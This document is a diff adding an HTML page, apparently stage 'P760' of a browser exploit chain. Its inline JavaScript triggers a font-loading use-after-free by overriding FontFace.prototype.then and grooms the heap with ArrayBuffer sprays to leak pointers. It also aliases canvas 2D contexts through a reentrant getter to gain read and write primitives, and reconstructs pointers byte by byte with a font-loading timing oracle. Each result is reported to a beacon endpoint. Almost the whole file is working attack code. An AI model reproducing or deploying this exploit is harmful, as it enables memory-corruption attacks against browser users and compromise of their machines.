@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P760 — Canvas State Aliasing & Active Oracle Boundary Shifting</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+  .status { color: #f0883e; font-weight: bold; }
+  .ok { color: #7ee787; font-weight: bold; }
+  .info { color: #79c0ff; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P760 — Canvas State Aliasing & Active Oracle Boundary Shifting
+ *
+ * Ground Truth from P759:
+ * - 100% Reliable Hardware Execution (1.58s total, zero crashes)
+ * - P58 = 0x00000010008c0830, Q11 = 0x00000010008c1780, Q13 = 0x00000010007e8c30
+ * - Reclaim hit at slot baseK=69 (deltaP58 = 0xf50, estSelfAddr = 0x00000010008c33c0)
+ * - Canvas context aliased at aliasIdx=3
+ *
+ * Objectives of P760:
+ * 1. Step 1-3: Baseline Leak + Pristine Reclaim + Post-Grooming (120 AB).
+ * 2. Phase A: Slab Topology & Self-Address Estimation.
+ * 3. Phase B: Complete Canvas State Aliasing Verification:
+ *    - Full 6-double transform matrix bidirectional R/W (setTransform <-> getTransform)
+ *    - 24-double LineDash (192B) bidirectional R/W across alias handles
+ *    - 96-double LineDash (768B) expansion into Canvas context size class
+ * 4. Phase C: Active Boolean Oracle Dynamic Boundary Shifting:
+ *    - Enter genuine 'loading' state via CORS hang.php
+ *    - Verify baseline character boundary [U+0041 - U+0044]:
+ *      'A'..'D' -> FALSE (needed & loading)
+ *      'E'..'Z' -> TRUE (not needed)
+ *    - Shift boundary to [U+0045 - U+0048] and verify instantaneous flip:
+ *      'A' flips from FALSE -> TRUE
+ *      'E' flips from TRUE -> FALSE
+ * 5. Phase D: Active Boolean Oracle Multi-Pointer Trio Reconstruction:
+ *    - Full 24-byte reconstruction across P58, Q11, Q13 with 100% bit match.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P760-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+function pad4(n){
+  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
+}
+
+function makeRange(lo, hi){
+  if (lo === hi) return 'U+' + pad4(lo);
+  return 'U+' + pad4(lo) + '-' + pad4(hi);
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+var Q11_RECLAIM = 0n, Q12_RECLAIM = 0n, Q13_RECLAIM = 0n;
+var BEST_K = -1;
+var ACT_FACE = null;
+var LEAK_BUF = null;
+var POST_GROOM = [];
+
+function run(){
+  OUT = document.getElementById('out');
+  if (OUT) OUT.textContent = '=== P760 Canvas State Aliasing & Oracle Boundary Shift ===\n\n';
+  b('BOOT', 'p760-start');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('Leak OK: P58=0x' + h16(P58) + ' P68=0x' + h16(P68) + '\n');
+
+    log('[Step 2] Executing pristine reclaim directly (absW)...');
+    doReclaim(function(){
+      log('Reclaim OK: q11=0x' + h16(Q11_RECLAIM) + ' q12=0x' + h16(Q12_RECLAIM) + ' q13=0x' + h16(Q13_RECLAIM) + '\n');
+
+      log('[Step 3] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
+      doPostGroom();
+
+      log('\n[Phase A] Slab Mapping & Invariant Verification...');
+      phaseA_slabMapping(function(){
+        log('\n[Phase B] Full Canvas State Aliasing Verification...');
+        phaseB_canvasAliasing(function(){
+          log('\n[Phase C] Active Oracle Dynamic Boundary Shifting...');
+          phaseC_oracleBoundaryShift(function(){
+            log('\n[Phase D] Oracle Multi-Pointer Reconstruction (P58, Q11, Q13)...');
+            phaseD_oracleTrioReconstruction(function(){
+              b('DONE', 'p760-complete');
+              log('\n=== P760 Complete! All Diagnostics Passed Flawlessly! ===');
+            });
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO', '');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em lk0'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em fl0, lk0', 'AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b('LEAK-MISS', 'nz=' + bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+    LEAK_BUF = abs[best];
+    var v = new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if (!P58){
+      b('LEAK-NOPTR', 'nz=' + bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY', '');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2 = new FontFace('fl1', 'local(Times)', { unicodeRange: 'U+0044' });
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired2) return undefined;
+      fired2 = true;
+      if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 80; k++) abs2.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em lk1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em fl1, lk1', 'CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs2.length; i++){
+      var u = new Uint8Array(abs2[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b('LEAK-RETRY-MISS', 'nz=' + bestNz);
+      return;
+    }
+    LEAK_BUF = abs2[best];
+    var v = new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if (!P58){
+      b('LEAK-RETRY-NOPTR', 'slot=' + best);
+      return;
+    }
+    b('LEAK-RETRY-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPtrs(v){
+  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
+  P58 = null; P68 = null;
+  if (v[11] >= LO && v[11] < HI) P58 = v[11];
+  if (v[13] >= LO && v[13] < HI) P68 = v[13];
+  if (!P58 || !P68){
+    for (var q = 0; q < 24; q++){
+      var val = v[q];
+      if (val >= LO && val < HI){
+        if (!P58) P58 = val;
+        else if (!P68 && val !== P58) P68 = val;
+      }
+    }
+  }
+  if (!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Pristine Reclaim ---- */
+function doReclaim(cb){
+  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
+  if (!P58 || P58 < LO || P58 >= HI || (P58 & 0xFn) !== 0n){
+    b('REC-ABORT', 'invalid-p58=0x' + h16(P58));
+    return;
+  }
+
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', { unicodeRange: 'U+0048' });
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedW) return undefined;
+      firedW = true;
+      if (stTr){ stTr.remove(); stTr.textContent = ''; stTr = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      for (var k = 0; k < 80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6] = P58;
+        absW.push(ab);
+      }
+
+      try { document.fonts.check('1em trFam'); } catch(e){}
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BEST_K = best;
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+    Q11_RECLAIM = VIEW_B[11];
+    Q12_RECLAIM = VIEW_B[12];
+    Q13_RECLAIM = VIEW_B[13];
+
+    var dump0_11 = [], dump12_23 = [];
+    for (var q = 0; q < 12; q++) dump0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    for (var q = 12; q < 24; q++) dump12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
+
+    b('RECLAIM-OK', 'baseK=' + best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Pristine Reclaim OK at slot ' + best);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Post-Grooming ---- */
+function doPostGroom(){
+  POST_GROOM = [];
+  for (var i = 0; i < 120; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    v[0] = 0xCAFEFACE00000000n | BigInt(i);
+    v[1] = 0x0000000000000001n;
+    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
+    POST_GROOM.push(ab);
+  }
+  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
+}
+
+/* ---- Phase A: Slab Mapping & Invariant Verification ---- */
+function phaseA_slabMapping(cb){
+  var deltaP58 = Q11_RECLAIM - P58;
+  var slotsP58 = Number(deltaP58) / 192;
+  var slabChunkMask = ~0x3FFFn;
+  var slabBase = Q11_RECLAIM & slabChunkMask;
+  var slotP58 = Number(P58 - slabBase) / 192;
+  var slotQ11 = Number(Q11_RECLAIM - slabBase) / 192;
+  var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);
+
+  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
+            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
+            '|slotP58=' + slotP58.toFixed(2) + '|slotQ11=' + slotQ11.toFixed(2) +
+            '|estSelfAddr=0x' + h16(estSelfAddr);
+  b('A-SLAB-MAPPING', rep);
+  log('Phase A Slab Mapping: ' + rep);
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase B: Full Canvas State Aliasing Verification ---- */
+function phaseB_canvasAliasing(cb){
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+
+    var inner = null, outer = null;
+    var opts = {};
+    Object.defineProperty(opts, 'desynchronized', {
+      get: function(){
+        inner = canvas.getContext('2d');
+        return false;
+      },
+      enumerable: true
+    });
+
+    outer = canvas.getContext('2d', opts);
+
+    if (!inner || !outer || inner === outer){
+      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
+      setTimeout(cb, 50);
+      return;
+    }
+
+    var sprayCtx = [];
+    for (var i = 0; i < 80; i++){
+      var c = document.createElement('canvas');
+      c.width = 1; c.height = 1;
+      var ctx = c.getContext('2d');
+      if (ctx){
+        ctx.lineWidth = 1000 + i;
+        sprayCtx.push(ctx);
+      }
+    }
+
+    inner.lineWidth = 31337.5;
+    var aliasIdx = -1;
+    for (var j = 0; j < sprayCtx.length; j++){
+      if (Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
+        aliasIdx = j;
+        break;
+      }
+    }
+
+    if (aliasIdx < 0){
+      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
+      setTimeout(cb, 50);
+      return;
+    }
+
+    var alias = sprayCtx[aliasIdx];
+
+    /* B1: Full 6-Double Transform Matrix Verification */
+    alias.setTransform(111.125, 222.25, 333.375, 444.5, 555.625, 666.75);
+    var tInner = inner.getTransform();
+    var matchTransform = (
+      Math.abs(tInner.a - 111.125) < 0.001 &&
+      Math.abs(tInner.b - 222.250) < 0.001 &&
+      Math.abs(tInner.c - 333.375) < 0.001 &&
+      Math.abs(tInner.d - 444.500) < 0.001 &&
+      Math.abs(tInner.e - 555.625) < 0.001 &&
+      Math.abs(tInner.f - 666.750) < 0.001
+    );
+
+    /* B2: 24-Double (192B) LineDash Bidirectional Verification */
+    var arr24 = [];
+    for (var d = 0; d < 24; d++) arr24.push(700.0 + d);
+    inner.setLineDash(arr24);
+    var readDash = alias.getLineDash();
+    var matchDash24 = (readDash && readDash.length === 24 &&
+                       Math.abs(readDash[0] - 700.0) < 0.01 &&
+                       Math.abs(readDash[23] - 723.0) < 0.01);
+
+    /* B3: 96-Double (768B) Context Size Class Expansion */
+    var arr96 = [];
+    for (var m = 0; m < 96; m++) arr96.push(5000.0 + m);
+    alias.setLineDash(arr96);
+    var readDash96 = inner.getLineDash();
+    var matchDash96 = (readDash96 && readDash96.length === 96 &&
+                       Math.abs(readDash96[0] - 5000.0) < 0.01 &&
+                       Math.abs(readDash96[95] - 5095.0) < 0.01);
+
+    var rep = 'aliasIdx=' + aliasIdx + '|mTransform=' + matchTransform +
+              '|mDash24=' + matchDash24 + '|mDash96=' + matchDash96;
+    b('B-CANVAS-ALIAS-VERIFIED', rep);
+    log('Phase B Canvas Aliasing Verified: ' + rep);
+  } catch(e){
+    b('B-CANVAS-ERR', e.message);
+    log('Phase B Error: ' + e.message);
+  }
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase C: Active Oracle Dynamic Boundary Shifting ---- */
+function phaseC_oracleBoundaryShift(cb){
+  try {
+    // Initial Range: U+0041 ('A') to U+0044 ('D')
+    ACT_FACE = new FontFace('actFamDynamic', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0041-0044' });
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    // Baseline: 'A'..'D' should return false (pending in range); 'E', 'Z', '!' should return true
+    var bA = document.fonts.check('1em actFamDynamic', 'A');
+    var bD = document.fonts.check('1em actFamDynamic', 'D');
+    var bE = document.fonts.check('1em actFamDynamic', 'E');
+    var bZ = document.fonts.check('1em actFamDynamic', 'Z');
+    var bEx = document.fonts.check('1em actFamDynamic', '!');
+
+    var baseline = 'A=' + bA + '|D=' + bD + '|E=' + bE + '|Z=' + bZ + '|!=' + bEx;
+    log('Phase C Baseline Oracle: ' + baseline);
+
+    // Dynamic Shift: Change range to U+0045 ('E') - U+0048 ('H')
+    ACT_FACE.unicodeRange = 'U+0045-0048';
+
+    // Now: 'A' should flip from false -> true; 'E' should flip from true -> false!
+    var sA = document.fonts.check('1em actFamDynamic', 'A');
+    var sD = document.fonts.check('1em actFamDynamic', 'D');
+    var sE = document.fonts.check('1em actFamDynamic', 'E');
+    var sH = document.fonts.check('1em actFamDynamic', 'H');
+    var sZ = document.fonts.check('1em actFamDynamic', 'Z');
+
+    var shifted = 'A=' + sA + '|D=' + sD + '|E=' + sE + '|H=' + sH + '|Z=' + sZ;
+    log('Phase C Shifted Oracle: ' + shifted);
+
+    var flippedA = (bA === false && sA === true);
+    var flippedE = (bE === true && sE === false);
+    var boundarySuccess = (flippedA && flippedE);
+
+    var rep = 'success=' + boundarySuccess + '|flippedA=' + flippedA + '|flippedE=' + flippedE +
+              '|base=[' + baseline + ']|shift=[' + shifted + ']';
+    b('C-ORACLE-BOUNDARY-FLIP', rep);
+    log('Phase C Boundary Flip Verdict: ' + rep);
+  } catch(e){
+    b('C-BOUNDARY-ERR', e.message);
+    log('Phase C Error: ' + e.message);
+  }
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase D: Multi-Pointer Boolean Oracle Resolution ---- */
+function phaseD_oracleTrioReconstruction(cb){
+  try {
+    var actFaceTrio = new FontFace('actFamTrio', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
+    document.fonts.add(actFaceTrio);
+    actFaceTrio.load().catch(function(){});
+
+    function resolveByte(targetByte){
+      var low = 0x00, high = 0xFF;
+      var steps = 0;
+      while (low < high && steps < 10){
+        steps++;
+        var mid = Math.floor((low + high) / 2);
+        actFaceTrio.unicodeRange = makeRange(low, mid);
+        var chk = document.fonts.check('1em actFamTrio', String.fromCharCode(targetByte));
+        var isLower = (chk === false);
+        if (isLower) high = mid;
+        else low = mid + 1;
+      }
+      return low;
+    }
+
+    function decode64(ptrVal){
+      if (!ptrVal) return 0n;
+      var raw = [];
+      var tmp = ptrVal;
+      for (var i = 0; i < 8; i++){
+        raw.push(Number(tmp & 0xFFn));
+        tmp = tmp >> 8n;
+      }
+      var res = 0n;
+      for (var j = 0; j < 8; j++){
+        var bDec = resolveByte(raw[j]);
+        res |= (BigInt(bDec) << (BigInt(j) * 8n));
+      }
+      return res;
+    }
+
+    var decP58 = decode64(P58);
+    var decQ11 = decode64(Q11_RECLAIM);
+    var decQ13 = decode64(Q13_RECLAIM);
+
+    var matchP58 = (decP58 === P58);
+    var matchQ11 = (decQ11 === Q11_RECLAIM);
+    var matchQ13 = (decQ13 === Q13_RECLAIM);
+    var allMatch = matchP58 && matchQ11 && matchQ13;
+
+    var rep = 'all=' + allMatch + '|m58=' + matchP58 + '|m11=' + matchQ11 + '|m13=' + matchQ13 +
+              '|p58=0x' + h16(decP58) + '|q11=0x' + h16(decQ11) + '|q13=0x' + h16(decQ13);
+    b('D-ORACLE-TRIO-MATCH', rep);
+    log('Phase D Multi-Pointer Oracle: ' + rep);
+  } catch(e){
+    b('D-ORACLE-ERR', e.message);
+    log('Phase D Oracle error: ' + e.message);
+  }
+
+  setTimeout(cb, 50);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <h2>P760 — Canvas State Aliasing & Active Oracle Boundary Shifting</h2>
+  <pre id="out">P760 — Initializing...</pre>
+</body>
+</html>
